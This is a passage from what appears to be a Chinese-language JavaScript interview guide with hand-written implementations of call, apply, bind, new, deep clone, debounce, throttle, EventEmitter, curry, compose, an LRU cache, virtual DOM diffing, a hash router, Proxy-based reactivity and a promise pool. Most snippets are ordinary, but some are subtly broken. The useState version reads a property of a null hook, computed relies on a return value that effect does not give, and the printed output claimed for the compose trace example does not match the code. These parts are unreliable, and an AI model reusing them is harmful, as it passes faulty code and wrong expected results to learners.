  // 用Symbol避免属性名冲突
  const fn = Symbol('fn');
  // 把this（当前函数）挂到context上
  context[fn] = this;
  // 通过context调用this，参数展开
  const result = context[fn](...args);
  // 清理
  delete context[fn];
  return result;
};

// 测试：
function greet(greeting, punct) {
  return `${greeting}, I'm ${this.name}${punct}`;
}
console.log(greet.myCall({ name: '张三' }, '你好', '！')); // 你好, I'm 张三！
console.log(greet.myCall({ name: '李四' }, '您好', '。')); // 您好, I'm 李四。
```

---

### 8. 手写 apply

```javascript
// 手写apply：调用函数，this指向第一个参数，其余参数用数组
Function.prototype.myApply = function(context = window, args = []) {
  if (context === null || context === undefined) context = window;
  const fn = Symbol('fn');
  context[fn] = this;
  const result = context[fn](...args);
  delete context[fn];
  return result;
};

// 测试：
function greet(greeting, punct) {
  return `${greeting}, I'm ${this.name}${punct}`;
}
console.log(greet.myApply({ name: '张三' }, ['你好', '！'])); // 你好, I'm 张三！
console.log(greet.myApply({ name: '李四' }, ['您好', '。'])); // 您好, I'm 李四。
```

---

### 9. 手写 bind

```javascript
// 手写bind：返回新函数，this永久绑定到第一个参数
Function.prototype.myBind = function(context = window, ...bindArgs) {
  const originalFn = this;

  function boundFn(...callArgs) {
    // new调用时，this是实例本身（优先级最高，忽略context）
    const isNew = this instanceof originalFn;
    const finalThis = isNew ? this : (context || window);
    return originalFn.apply(finalThis, [...bindArgs, ...callArgs]);
  }

  // 继承原型链：boundFn.prototype = Object.create(originalFn.prototype)
  function Empty() {}
  Empty.prototype = originalFn.prototype;
  boundFn.prototype = new Empty();

  return boundFn;
};

// 测试：
function greet(greeting) { return `${greeting}, I'm ${this.name}`; }
const bound = greet.myBind({ name: '张三' });
console.log(bound('你好'));  // 你好, I'm 张三
console.log(bound.call({ name: '无效' }, 'hi')); // hi, I'm 张三（bind无法覆盖）

// new优先级：
function Person(name, age) {
  this.name = name; this.age = age;
}
const BoundPerson = Person.myBind(null, '张三');
const p = new BoundPerson(18);
console.log(p.name, p.age); // 张三, 18（new时this指向实例）
```

---

### 10. 手写 new 操作符

```javascript
// 手写new：创建实例，原型绑定，this绑定
function myNew(Constructor, ...args) {
  if (typeof Constructor !== 'function') {
    throw new TypeError('Constructor is not a function');
  }

  // 1. 创建新对象，原型指向构造函数的prototype
  const obj = Object.create(Constructor.prototype);

  // 2. 调用构造函数，this指向新对象
  const result = Constructor.apply(obj, args);

  // 3. 返回：如果构造函数显式返回对象/函数，就用那个；否则返回新对象
  // 注意：构造函数若返回原始值则忽略，仍返回新对象
  if (result !== null && (typeof result === 'object' || typeof result === 'function')) {
    return result;
  }
  return obj;
}

// 测试：
function Person(name, age) {
  this.name = name;
  this.age = age;
}
Person.prototype.greet = function() {
  return `我是${this.name}，${this.age}岁`;
};

const p = myNew(Person, '张三', 18);
console.log(p.name);      // 张三
console.log(p.greet());   // 我是张三，18岁
console.log(p instanceof Person); // true
console.log(p.constructor === Person); // true
```

---

### 11. 手写 instanceof

```javascript
// instanceof：检查对象是否在构造函数的原型链上
function myInstanceOf(left, right) {
  if (left === null || typeof left !== 'object') return false;
  if (typeof right !== 'function') throw new TypeError('Right-hand side of instanceof must be a function');

  let proto = Object.getPrototypeOf(left);
  const prototype = right.prototype;

  while (proto !== null) {
    if (proto === prototype) return true;
    proto = Object.getPrototypeOf(proto);
  }
  return false;
}

// 测试：
function Parent() {}
function Child() {}
Child.prototype = Object.create(Parent.prototype);
Child.prototype.constructor = Child;

const c = new Child();
console.log(myInstanceOf(c, Child));    // true
console.log(myInstanceOf(c, Parent));    // true
console.log(myInstanceOf(c, Object));    // true
console.log(myInstanceOf({}, Object));   // true
console.log(myInstanceOf('str', String)); // false（字符串不是对象）
console.log(myInstanceOf(null, Object)); // false
```

---

### 12. 手写 Object.create

```javascript
// 手写Object.create：创建对象，原型指向传入的proto
function myObjectCreate(proto) {
  if (typeof proto !== 'object' && typeof proto !== 'function' && proto !== null) {
    throw new TypeError('Object prototype may only be an Object or null');
  }

  // 临时构造函数
  function Temp() {}

  // 原型指向传入的proto
  Temp.prototype = proto;

  // 返回新对象，其__proto__ === proto
  return new Temp();
}

// 测试：
const parent = { name: 'parent' };
const child = myObjectCreate(parent);
console.log(child.name); // parent
console.log(Object.getPrototypeOf(child) === parent); // true
console.log(child instanceof Object); // true（因为parent的原型链上有Object）
```

---

### 13. 手写深拷贝

```javascript
// 手写深拷贝：支持循环引用、Symbol、Date、RegExp、函数、Map、Set等
function deepClone(target, hash = new WeakMap()) {
  // 处理原始类型
  if (target === null || typeof target !== 'object') return target;

  // 处理循环引用
  if (hash.has(target)) return hash.get(target);

  // 处理Date
  if (target instanceof Date) return new Date(target);

  // 处理RegExp
  if (target instanceof RegExp) return new RegExp(target.source, target.flags);

  // 处理Error
  if (target instanceof Error) {
    const err = new Error(target.message);
    err.name = target.name;
    err.stack = target.stack;
    return err;
  }

  // 处理函数
  if (typeof target === 'function') {
    if (target.prototype) {
      // 普通函数：返回包装函数
      return function(...args) { return target.apply(this, args); };
    }
    // 箭头函数：直接返回
    return target;
  }

  // 处理Map
  if (target instanceof Map) {
    const clone = new Map();
    hash.set(target, clone);
    target.forEach((v, k) => clone.set(deepClone(k, hash), deepClone(v, hash)));
    return clone;
  }

  // 处理Set
  if (target instanceof Set) {
    const clone = new Set();
    hash.set(target, clone);
    target.forEach(v => clone.add(deepClone(v, hash)));
    return clone;
  }

  // 处理数组和普通对象
  const clone = Array.isArray(target) ? [] : {};
  hash.set(target, clone);
  for (const key of Object.keys(target)) {
    clone[key] = deepClone(target[key], hash);
  }
  return clone;
}

// 测试：
const original = {
  date: new Date(),
  regex: /test/gi,
  map: new Map([['a', 1]]),
  set: new Set([1, 2]),
  nested: { fn: () => 'hello' }
};
original.circular = original; // 循环引用
const cloned = deepClone(original);
console.log(cloned.date instanceof Date); // true
console.log(cloned.regex.source); // test
console.log(cloned.map.get('a')); // 1
console.log(cloned.circular === original); // false（不是同一个引用）
console.log(cloned.nested.fn()); // hello
```

---

### 14. 手写防抖 debounce

```javascript
// 防抖：n秒后执行，n秒内再次触发则重新计时
function debounce(fn, delay, immediate = false) {
  let timer = null;

  return function(...args) {
    const context = this;
    // 立即执行模式（第一次触发立即执行）
    if (immediate && !timer) {
      fn.apply(context, args);
    }
    // 清除之前的定时器，重新计时
    clearTimeout(timer);
    timer = setTimeout(() => {
      if (!immediate) {
        fn.apply(context, args);
      }
      timer = null;
    }, delay);
  };
}

// 进阶：返回函数，允许手动取消和立即执行
function debounceAdvanced(fn, delay, options = {}) {
  let timer = null;
  let lastArgs = null;
  const { leading = false, trailing = true, maxWait } = options;

  let maxTimer = null;

  function invoke() {
    if (lastArgs) {
      fn.apply(this, lastArgs);
      lastArgs = null;
      clearTimeout(maxTimer);
      maxTimer = null;
    }
  }

  return function(...args) {
    const context = this;

    // leading：立即执行
    if (leading && !timer) {
      fn.apply(context, args);
    }

    clearTimeout(timer);
    lastArgs = args;

    // trailing：在delay后执行
    timer = setTimeout(() => {
      invoke.call(context);
      timer = null;
    }, delay);

    // maxWait：在超过maxWait后强制执行（防抖+节流的混合）
    if (maxWait !== undefined && !maxTimer) {
      maxTimer = setTimeout(() => {
        invoke.call(context);
        maxTimer = null;
      }, maxWait);
    }
  };
}

// 使用：
const handleSearch = debounce(async (query) => {
  const res = await fetch(`/search?q=${query}`);
  render(await res.json());
}, 300);
input.addEventListener('input', e => handleSearch(e.target.value));
```

---

### 15. 手写节流 throttle

```javascript
// 节流：n秒内只执行一次（固定频率）
function throttle(fn, delay) {
  let lastTime = 0;

  return function(...args) {
    const now = Date.now();
    if (now - lastTime >= delay) {
      fn.apply(this, args);
      lastTime = now;
    }
  };
}

// 进阶：支持leading和trailing
function throttleAdvanced(fn, delay, options = {}) {
  let lastTime = 0;
  let timer = null;
  const { leading = true, trailing = true } = options;

  return function(...args) {
    const context = this;
    const now = Date.now();

    if (!lastTime && !leading) lastTime = now;

    const remaining = delay - (now - lastTime);
    if (remaining <= 0) {
      clearTimeout(timer);
      timer = null;
      lastTime = now;
      fn.apply(context, args);
    } else if (!timer && trailing) {
      clearTimeout(timer);
      timer = setTimeout(() => {
        lastTime = leading ? Date.now() : 0;
        timer = null;
        fn.apply(context, args);
      }, remaining);
    }
  };
}

// RAF节流（最精确，配合屏幕刷新率）：
function throttleRAF(fn) {
  let pending = false;
  return function(...args) {
    if (!pending) {
      pending = true;
      requestAnimationFrame(() => {
        fn.apply(this, args);
        pending = false;
      });
    }
  };
}

// 使用：
const handleScroll = throttleRAF(() => {
  const scrollY = window.scrollY;
  // 执行滚动相关逻辑
});
window.addEventListener('scroll', handleScroll);
```

---

### 16. 手写 EventEmitter

```javascript
// 手写EventEmitter：发布订阅模式
class EventEmitter {
  constructor() {
    this.events = {}; // { eventName: [handler1, handler2, ...] }
  }

  // 订阅
  on(event, handler) {
    if (!this.events[event]) this.events[event] = [];
    this.events[event].push(handler);
    return this; // 支持链式调用
  }

  // 只订阅一次
  once(event, handler) {
    const onceHandler = (...args) => {
      this.off(event, onceHandler); // 先取消，再执行
      handler.apply(this, args);
    };
    return this.on(event, onceHandler);
  }

  // 取消订阅
  off(event, handler) {
    if (!handler) {
      this.events[event] = []; // 移除该事件所有handler
      return this;
    }
    this.events[event] = (this.events[event] || []).filter(h => h !== handler);
    return this;
  }

  // 发布（同步）
  emit(event, ...args) {
    const handlers = this.events[event] || [];
    handlers.forEach(h => h.apply(this, args));
    return this;
  }

  // 移除所有订阅（或指定事件）
  removeAllListeners(event) {
    if (event) delete this.events[event];
    else this.events = {};
    return this;
  }

  // 返回订阅数（用于测试）
  listenerCount(event) {
    return (this.events[event] || []).length;
  }
}

// 测试：
const emitter = new EventEmitter();

function onClick(data) { console.log('click:', data); }
function onMove(data) { console.log('move:', data); }

emitter.on('click', onClick);
emitter.on('move', onMove);
emitter.once('click', (d) => console.log('once:', d));

emitter.emit('click', { x: 1 }); // click: {x:1}, once: {x:1}
emitter.emit('click', { x: 2 }); // click: {x:2}（once已移除）
emitter.off('click', onClick);
emitter.emit('click', { x: 3 }); // 无输出（已取消）

emitter.removeAllListeners('move');
emitter.emit('move', {}); // 无输出
```

---

### 17. 手写观察者模式

```javascript
// 观察者模式：目标（Subject）管理观察者（Observer），状态变化时通知
class Subject {
  constructor() {
    this.observers = new Set(); // 用Set保证唯一性
  }

  // 添加观察者
  attach(observer) {
    this.observers.add(observer);
  }

  // 移除观察者
  detach(observer) {
    this.observers.delete(observer);
  }

  // 通知所有观察者
  notify() {
    this.observers.forEach(observer => observer.update(this));
  }
}

// 具体目标：气象站
class WeatherStation extends Subject {
  constructor() {
    super();
    this.temperature = 0;
    this.humidity = 0;
  }

  setMeasurements(temp, humidity) {
    this.temperature = temp;
    this.humidity = humidity;
    this.notify(); // 状态变化，通知所有观察者
  }
}

// 具体观察者：手机App显示
class MobileApp {
  constructor(station) {
    this.station = station;
    station.attach(this); // 订阅
  }

  update(subject) {
    console.log(`手机App: 温度=${subject.temperature}°C, 湿度=${subject.humidity}%`);
  }
}

// 具体观察者：大屏显示
class Dashboard {
  constructor(station) {
    this.station = station;
    station.attach(this);
  }

  update(subject) {
    console.log(`大屏: ${subject.temperature}°C | ${subject.humidity}%`);
  }
}

// 测试：
const station = new WeatherStation();
const mobile = new MobileApp(station);
const dash = new Dashboard(station);

station.setMeasurements(25, 60);
// 手机App: 温度=25°C, 湿度=60%
// 大屏: 25°C | 60%

station.detach(mobile); // 取消订阅
station.setMeasurements(28, 55);
// 大屏: 28°C | 55%（手机不再收到通知）

// 观察者 vs 发布订阅：
// 观察者：Subject直接持有Observer引用（紧耦合）
// 发布订阅：通过EventEmitter解耦（更灵活）
```

---

### 18. 手写柯里化 curry

```javascript
// 柯里化：把多参数函数转为系列单参数函数
function curry(fn) {
  // 获取原函数参数个数
  const arity = fn.length;

  return function curried(...args) {
    // 参数够数就执行，不够就继续返回函数收集参数
    if (args.length >= arity) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}

// 自动柯里化（参数不够时自动收集）
function curryAuto(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return (...args2) => curried.apply(this, args.concat(args2));
  };
}

// 测试：
function add(a, b, c) { return a + b + c; }
const curriedAdd = curry(add);
console.log(curriedAdd(1)(2)(3));   // 6
console.log(curriedAdd(1, 2)(3));   // 6
console.log(curriedAdd(1)(2, 3));   // 6
console.log(curriedAdd(1, 2, 3));   // 6

// 应用：参数预填充（partial application）
const add10 = curry(add)(10);
console.log(add10(20)(30)); // 60

// 实际例子：日志
const log = curry((level, message, meta) =>
  console.log(`[${level}] ${message}`, meta)
);
const info = log('INFO');
info('系统启动', { pid: 123 });
info('用户登录', { uid: 456 });
```

---

### 19. 手写 compose

```javascript
// compose：从右到左组合多个函数
// compose(f, g, h)(x) === f(g(h(x)))
function compose(...fns) {
  if (fns.length === 0) return x => x;
  if (fns.length === 1) return fns[0];
  return fns.reduceRight((f, g) =>
    (...args) => f(g(...args))
  );
}

// pipe：从左到右组合（更直观）
function pipe(...fns) {
  if (fns.length === 0) return x => x;
  if (fns.length === 1) return fns[0];
  return fns.reduce((f, g) =>
    (...args) => g(f(...args))
  );
}

// trace：调试compose中间结果
const trace = label => x => { console.log(`${label}:`, x); return x; };

// 测试：
const double = x => x * 2;
const addOne = x => x + 1;
const square = x => x * x;

const process = compose(
  trace('输入'),
  double,
  trace('翻倍后'),
  addOne,
  trace('加一后'),
  square,
  trace('平方后')
);
process(2);
// 输入: 2
// 平方后: 4
// 加一后: 5
// 翻倍后: 10
// 输入: 20

// composeRight（从左到右执行）：
function composeRight(...fns) {
  return fns.reduceRight((f, g) => (...args) => g(f(...args)));
}

// 实际应用：数据处理管道
const processUser = pipe(
  validateInput,        // 验证输入
  normalizeData,        // 规范化
  removeDuplicates,     // 去重
  enrichWithMeta,       // 补充元信息
  formatOutput          // 格式化输出
);
```

---

### 20. 手写数组扁平化 flatten

```javascript
// 手写flatten：数组扁平化（指定深度）
function flatten(arr, depth = 1) {
  const result = [];
  for (const item of arr) {
    if (Array.isArray(item) && depth > 0) {
      // 递归扁平化（深度-1）
      result.push(...flatten(item, depth - 1));
    } else {
      result.push(item);
    }
  }
  return result;
}

// 无限深度版
function flattenDeep(arr) {
  return arr.reduce((acc, item) =>
    Array.isArray(item) ? acc.concat(flattenDeep(item)) : acc.concat(item)
  , []);
}

// ES2019 flat（内置）
const r = [1, [2, [3, [4]]]].flat(2); // [1, 2, 3, [4]]
const rDeep = [1, [2, [3, [4]]]].flat(Infinity); // [1, 2, 3, 4]

// 手动实现.flat（用于理解）：
Array.prototype.myFlat = function(depth = 1) {
  const result = [];
  const flat = (arr, d) => {
    for (const item of arr) {
      if (Array.isArray(item) && d > 0) {
        flat(item, d - 1);
      } else {
        result.push(item);
      }
    }
  };
  flat(this, depth);
  return result;
};

// 带separator的join（不常用）：
function flattenWithSeparator(arr, separator = ',') {
  return arr.toString().split(separator);
}

// 测试：
console.log(flatten([1, [2, [3, [4]]]], 1)); // [1, 2, [3, [4]]]
console.log(flatten([1, [2, [3, [4]]]], 2)); // [1, 2, 3, [4]]
console.log(flattenDeep([1, [2, [3, [4]]]])); // [1, 2, 3, 4]
```

---

### 21. 手写 LRU 缓存

```javascript
// LRU Cache：最近最少使用缓存（淘汰最久未使用的）
// 实现：HashMap + 双向链表（O(1) get/put）

class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.cache = new Map(); // Map保持插入顺序
  }

  get(key) {
    if (!this.cache.has(key)) return -1;
    // 读取后移到最后（最近使用）
    const value = this.cache.get(key);
    this.cache.delete(key);
    this.cache.set(key, value);
    return value;
  }

  put(key, value) {
    if (this.cache.has(key)) {
      // 更新，移到最后
      this.cache.delete(key);
      this.cache.set(key, value);
    } else {
      // 新增
      if (this.cache.size >= this.capacity) {
        // 淘汰最老的（Map的第一个key）
        const firstKey = this.cache.keys().next().value;
        this.cache.delete(firstKey);
      }
      this.cache.set(key, value);
    }
  }
}

// 用双向链表实现（面试时展示原理）：
class LRUCache链表 {
  constructor(capacity) {
    this.capacity = capacity;
    this.head = new Node(null, null); // 虚拟头
    this.tail = new Node(null, null); // 虚拟尾
    this.head.next = this.tail;
    this.tail.prev = this.head;
    this.cache = new Map();
  }

  get(key) {
    if (!this.cache.has(key)) return -1;
    const node = this.cache.get(key);
    this.moveToTail(node); // 移到尾部（最近使用）
    return node.value;
  }

  put(key, value) {
    if (this.cache.has(key)) {
      const node = this.cache.get(key);
      node.value = value;
      this.moveToTail(node);
    } else {
      if (this.cache.size >= this.capacity) {
        const first = this.head.next;
        this.remove(first);
        this.cache.delete(first.key);
      }
      const newNode = new Node(key, value);
      this.cache.set(key, newNode);
      this.addToTail(newNode);
    }
  }

  addToTail(node) {
    node.prev = this.tail.prev;
    node.next = this.tail;
    this.tail.prev.next = node;
    this.tail.prev = node;
  }

  remove(node) {
    node.prev.next = node.next;
    node.next.prev = node.prev;
  }

  moveToTail(node) {
    this.remove(node);
    this.addToTail(node);
  }
}

class Node {
  constructor(key, value) {
    this.key = key;
    this.value = value;
    this.prev = null;
    this.next = null;
  }
}

// 测试：
const cache = new LRUCache(3);
cache.put('a', 1);
cache.put('b', 2);
cache.put('c', 3);
console.log(cache.get('a')); // 1（a移到末尾：[b,c,a]）
cache.put('d', 4); // 淘汰b：[c,a,d]
console.log(cache.get('b')); // -1（已淘汰）
```

---

### 22. 手写虚拟 DOM 和 diff

```javascript
// 虚拟DOM：h函数创建vnode + patch打补丁 + diff简化版

// h函数：创建虚拟节点
function h(tag, props = {}, children = []) {
  return { tag, props, children };
}

// patch：对比新旧vnode，打补丁
function patch(oldVnode, newVnode) {
  if (oldVnode.tag !== newVnode.tag) {
    // 标签不同，直接替换
    const oldEl = oldVnode.el;
    const newEl = createElement(newVnode);
    oldEl.parentNode.replaceChild(newEl, oldEl);
    return newEl;
  }

  // 相同标签：比较props
  const el = oldVnode.el;
  newVnode.el = el;

  // 更新props
  updateProps(el, oldVnode.props, newVnode.props);

  // diff children
  patchChildren(el, oldVnode.children, newVnode.children);

  return el;
}

function patchChildren(el, oldChildren, newChildren) {
  const oldLen = oldChildren.length;
  const newLen = newChildren.length;
  const minLen = Math.min(oldLen, newLen);

  // 更新前面的（复用节点）
  for (let i = 0; i < minLen; i++) {
    patch(oldChildren[i], newChildren[i]);
  }

  // 新children更长：新增
  if (newLen > oldLen) {
    for (let i = oldLen; i < newLen; i++) {
      el.appendChild(createElement(newChildren[i]));
    }
  }
  // 旧children更长：删除
  else if (newLen < oldLen) {
    for (let i = minLen; i < oldLen; i++) {
      el.removeChild(oldChildren[i].el);
    }
  }
}

function updateProps(el, oldProps, newProps) {
  // 移除旧的props
  for (const key of Object.keys(oldProps)) {
    if (!newProps[key]) el.removeAttribute(key);
  }
  // 设置新的props
  for (const key of Object.keys(newProps)) {
    if (el[key] !== newProps[key]) el[key] = newProps[key];
  }
}

function createElement(vnode) {
  const el = document.createElement(vnode.tag);
  vnode.el = el;
  // 设置props
  updateProps(el, {}, vnode.props);
  // 递归创建子节点
  vnode.children.forEach(child => {
    if (typeof child === 'string') {
      el.appendChild(document.createTextNode(child));
    } else {
      el.appendChild(createElement(child));
    }
  });
  return el;
}

// render函数：把vnode渲染到container
function render(vnode, container) {
  container.appendChild(createElement(vnode));
}

// 测试：
const vnode1 = h('div', { class: 'container' }, [
  h('h1', {}, ['Hello']),
  h('p', {}, ['Virtual DOM'])
]);

const vnode2 = h('div', { class: 'wrapper' }, [
  h('h1', {}, ['Hello World']),
  h('p', {}, ['Updated content']),
  h('span', {}, ['New element'])
]);

// 模拟diff：直接patch根节点
const container = document.getElementById('app');
render(vnode1, container);
patch(vnode1, vnode2); // diff更新
```

---

### 23. 手写 React useState 简化版

```javascript
// 手写useState：React Hooks简化版（渲染驱动更新）

let isRendering = false;
let currentlyRenderingFiber = null;
let workInProgressHook = null;

function useState(initial) {
  // 获取当前hook
  const hook = currentlyRenderingFiber.memoizedState;

  if (hook !== null) {
    // 不是首次渲染，返回当前状态
    return [hook.memoizedState, (action) => {
      hook.memoizedState = typeof action === 'function'
        ? action(hook.memoizedState)
        : action;
      // 触发重新渲染
      currentlyRenderingFiber.sibling = null;
      schedule(); // 模拟React的调度
    }];
  }

  // 首次渲染：初始化state
  hook.memoizedState = initial;

  const setState = (action) => {
    hook.memoizedState = typeof action === 'function'
      ? action(hook.memoizedState)
      : action;
    schedule();
  };

  return [hook.memoizedState, setState];
}

// Fiber节点
function createFiber(vnode) {
  return {
    type: vnode.tag,
    props: vnode.props,
    child: null,
    sibling: null,
    memoizedState: null, // hooks链表
    stateNode: createDOM(vnode)
  };
}

function createDOM(vnode) {
  if (typeof vnode === 'string') {
    return document.createTextNode(vnode);
  }
  const el = document.createElement(vnode.tag);
  // 设置props
  for (const [key, value] of Object.entries(vnode.props || {})) {
    el[key] = value;
  }
  // 递归创建子节点
  (vnode.children || []).forEach(child => {
    el.appendChild(typeof child === 'object' ? createDOM(child) : document.createTextNode(child));
  });
  return el;
}

// 简化调度
let taskQueue = null;
function schedule() {
  if (!taskQueue) {
    taskQueue = setTimeout(() => {
      isRendering = true;
      currentlyRenderingFiber = null;
      // 重新执行App（模拟React.render）
      workLoop();
      isRendering = false;
      taskQueue = null;
    }, 0);
  }
}

function workLoop() {
  while (workInProgressHook !== null) {
    workInProgressHook = workInProgressHook.next;
  }
}

// 测试（概念演示，实际需配合React运行时）
// 注意：这是简化版思路，真正React需要Fiber架构、reconciliation等完整实现
```

---

### 24. 手写简易 Router（Hash模式）

```javascript
// 手写简易Router：Hash模式
class Router {
  constructor(routes = []) {
    this.routes = routes;
    this.currentPath = this.getPath();

    // 监听hash变化
    window.addEventListener('hashchange', () => {
      const path = this.getPath();
      if (path !== this.currentPath) {
        this.currentPath = path;
        this.render();
      }
    });

    // 初始渲染
    this.render();
  }

  getPath() {
    return window.location.hash.slice(1) || '/';
  }

  navigate(path) {
    window.location.hash = path;
  }

  match(path) {
    // 精确匹配 > 动态路由匹配
    const exact = this.routes.find(r => r.path === path && !r.path.includes(':'));
    if (exact) return exact;

    // 动态路由：/user/:id
    return this.routes.find(r => {
      if (!r.path.includes(':')) return false;
      const pattern = r.path.replace(/:[^/]+/g, '([^/]+)');
      const regex = new RegExp(`^${pattern}$`);
      return regex.test(path);
    });
  }

  getParams(path, route) {
    const params = {};
    const keys = (route.path.match(/:([^/]+)/g) || []).map(k => k.slice(1));
    const values = path.match(new RegExp(route.path.replace(/:[^/]+/g, '([^/]+)')));
    keys.forEach((key, i) => params[key] = values[i + 1]);
    return params;
  }

  render() {
    const path = this.currentPath;
    const route = this.match(path);

    if (!route) {
      this.onNotFound();
      return;
    }

    const params = this.getParams(path, route);
    route.component({ path, params, navigate: this.navigate.bind(this) });
  }

  onNotFound() {
    console.warn('Route not found:', this.currentPath);
  }
}

// 示例：定义组件
const Home = () => console.log('Home页面');
const User = ({ params }) => console.log('User:', params.id);
const Article = ({ params }) => console.log('Article:', params.id);

// 创建Router
const router = new Router([
  { path: '/', component: Home },
  { path: '/user/:id', component: User },
  { path: '/article/:id', component: Article }
]);

// 跳转
router.navigate('/user/123');
router.navigate('/article/456');
console.log(router.currentPath); // /article/456

// History模式（类似，只是监听popstate）
class HistoryRouter {
  constructor(routes) {
    this.routes = routes;
    this.currentPath = window.location.pathname;
    window.addEventListener('popstate', () => {
      this.currentPath = window.location.pathname;
      this.render();
    });
    this.render();
  }

  navigate(path) {
    history.pushState(null, '', path);
    this.currentPath = path;
    this.render();
  }
}
```

---

### 25. 手写 reactive（Proxy响应式简化版）

```javascript
// 手写响应式：Proxy实现Vue3风格的reactive
let activeEffect = null;

function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      const value = Reflect.get(target, key, receiver);
      // 收集依赖（track）
      if (activeEffect) {
        if (!depMap.has(target)) depMap.set(target, new Map());
        if (!depMap.get(target).has(key)) depMap.get(target).set(key, new Set());
        depMap.get(target).get(key).add(activeEffect);
      }
      // 深层响应式
      if (value !== null && typeof value === 'object') {
        return reactive(value);
      }
      return value;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      // 触发更新（trigger）
      if (oldValue !== value) {
        const deps = depMap.get(target)?.get(key);
        if (deps) {
          deps.forEach(effect => effect());
        }
      }
      return result;
    }
  });
}

// 依赖收集表：target → key → [effect1, effect2, ...]
const depMap = new WeakMap();

// effect：副作用函数，执行时自动收集依赖
function effect(fn) {
  const wrapped = () => {
    activeEffect = wrapped;
    fn();
    activeEffect = null;
  };
  wrapped(); // 执行一次，收集依赖
}

// computed：计算属性
function computed(fn) {
  let value;
  let dirty = true;
  const runner = effect(() => {
    if (!dirty) return value;
    value = fn();
    dirty = false;
  });
  return () => {
    if (dirty) {
      value = fn();
      dirty = false;
    }
    return value;
  };
}

// watch：监听变化
function watch(source, cb) {
  let oldValue, newValue;
  const getter = typeof source === 'function' ? source : () => source;
  const job = () => {
    newValue = getter();
    if (newValue !== oldValue) {
      cb(newValue, oldValue);
      oldValue = newValue;
    }
  };
  effect(job);
}

// 测试：
const state = reactive({ count: 0, name: '张三' });

effect(() => {
  console.log('count变化了:', state.count);
});
effect(() => {
  console.log('name变化了:', state.name);
});

state.count++; // 打印: count变化了: 1
state.count = 5; // 打印: count变化了: 5
state.name = '李四'; // 打印: name变化了: 李四

// computed
const double = computed(() => state.count * 2);
console.log(double()); // 2
state.count = 3;
console.log(double()); // 6
```

---

### 26. 手写并发控制（限制并发数）

```javascript
// 手写并发控制：限制同时运行的Promise数量
// 也叫"Promise池"

class PromisePool {
  constructor(maxConcurrent) {
    this.maxConcurrent = maxConcurrent;
    this.running = 0;
    this.queue = [];
  }

  // 添加任务到池
  add(taskFn) {
    return new Promise((resolve, reject) => {
      const task = () => {
        this.running++;
        Promise.resolve()
          .then(() => taskFn())
          .then(resolve, reject)
          .finally(() => {
            this.running--;
            this.next();
          });
      };

      if (this.running < this.maxConcurrent) {
        task();
      } else {
        this.queue.push(task);
      }
    });
  }

  // 取出下一个任务
  next() {
    if (this.queue.length > 0) {
      this.queue.shift()();
    }
  }

  // 当前运行中的任务数
  get size() { return this.running; }
}

// 简化版（一次性提交批量任务）：
function limitConcurrency(tasks, max) {
  return new Promise((resolve, reject) => {
    let running = 0;
    let index = 0;
    const results = new Array(tasks.length);
    const len = tasks.length;

    function runTask(i) {
      running++;
      tasks[i]()
        .then(val => { results[i] = { success: true, value: val }; })
        .catch(err => { results[i] = { success: false, reason: err }; })
        .finally(() => {
          running--;
          if (index < len) runTask(index++);
          else if (running === 0) resolve(results);
        });
    }

    // 启动初始任务
    while (running < max && index < len) {
      runTask(index++);
    }
  });
}

// 测试：
const tasks = Array.from({ length: 10 }, (_, i) => () =>
  new Promise(r => setTimeout(() => { console.log(`task ${i} done`); r(i); }, Math.random() * 1000))
);

limitConcurrency(tasks, 3).then(results => {
  console.log('全部完成', results.map(r => r.value));
});
// 最多同时运行3个任务
```

---

### 27. 手写图片懒加载（IntersectionObserver）

```javascript
// 手写图片懒加载：IntersectionObserver
class LazyLoad {
  constructor(options = {}) {
    this.root = options.root || null;
    this.rootMargin = options.rootMargin || '200px'; // 提前200px加载
    this.threshold = options.threshold || 0;
    this.onLoad = options.onLoad || (() => {});

    this.observer = new IntersectionObserver(
      this._onIntersect.bind(this),
      { root: this.root, rootMargin: this.rootMargin, threshold: this.threshold }
    );
  }

  _onIntersect(entries) {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const img = entry.target;
        const src = img.dataset.src;
        if (src) {
          img.src = src;
          img.removeAttribute('data-src');
          img.classList.remove('lazy');
          this.observer.unobserve(img);
          this.onLoad(img);
        }
      }
    });
  }

  // 观察一个或多个图片元素
  observe(element) {
    if (typeof element === 'string') {
      document.querySelectorAll(element).forEach(el => this.observer.observe(el));
    } else {
      this.observer.observe(element);
    }
  }

  // 停止观察
  disconnect() {
    this.observer.disconnect();
  }
}

// 使用：
const lazy = new LazyLoad({
  rootMargin: '300px',
  onLoad: (img) => img.classList.add('loaded')
});
lazy.observe('img.lazy'); // 观察所有.lazy图片

// 或者直接用：
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      observer.unobserve(img);
    }
  });
}, { rootMargin: '200px' });

document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img));
```

---

### 28. 手写虚拟列表

```javascript
// 手写虚拟列表：只渲染可见区域，支持固定高度
class VirtualList {
  constructor({ container, list, itemHeight, renderItem, overscan = 3 }) {
    this.container = container;
    this.list = list;
    this.itemHeight = itemHeight;
    this.renderItem = renderItem;
    this.overscan = overscan; // 上下多渲染几行
    this.scrollTop = 0;

    // 总高度容器（形成滚动条）
    this.spacer = document.createElement('div');
    this.spacer.style.cssText = `position:relative;height:${list.length * itemHeight}px;`;
    container.appendChild(this.spacer);

    // 列表容器
    this.listContainer = document.createElement('div');
    this.listContainer.style.cssText = 'position:absolute;top:0;left:0;right:0;';
    container.appendChild(this.listContainer);

    // 绑定滚动
    container.addEventListener('scroll', () => {
      this.scrollTop = container.scrollTop;
      this.render();
    });

    this.render();
  }

  getStartIndex() {
    return Math.floor(this.scrollTop / this.itemHeight);
  }

  getEndIndex() {
    const visibleCount = Math.ceil(this.container.clientHeight / this.itemHeight);
    return this.getStartIndex() + visibleCount;
  }

  render() {
    const start = Math.max(0, this.getStartIndex() - this.overscan);
    const end = Math.min(this.list.length - 1, this.getEndIndex() + this.overscan);

    this.listContainer.innerHTML = '';

    for (let i = start; i <= end; i++) {
      const el = this.renderItem(this.list[i], i);
